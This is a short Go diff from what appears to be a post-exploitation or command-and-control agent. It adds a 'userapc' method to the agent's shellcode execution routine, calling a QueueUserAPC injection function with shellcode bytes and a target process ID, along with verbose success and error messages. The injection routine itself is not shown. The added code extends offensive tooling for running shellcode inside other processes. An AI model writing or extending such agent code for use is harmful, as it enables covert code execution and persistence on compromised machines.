@@ -803,6 +803,15 @@ func (a *Agent) executeShellcode(shellcode messages.Shellcode) error {
 			}
 		} else {if a.Verbose {message("success", "Shellcode was successfully executed")}}
 		return err
+	}else if shellcode.Method == "userapc" {
+		err := ExecuteShellcodeQueueUserAPC(shellcodeBytes, shellcode.PID)
+		if err != nil {
+			if a.Verbose {
+				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
+				message("warn", fmt.Sprintf("Error: %s", err.Error()))
+			}
+		} else {if a.Verbose {message("success", "Shellcode was successfully executed")}}
+		return err
 	}else {
 		if a.Verbose{
 			message("warn", fmt.Sprintf("Invalid shellcode execution method: %s", shellcode.Method))
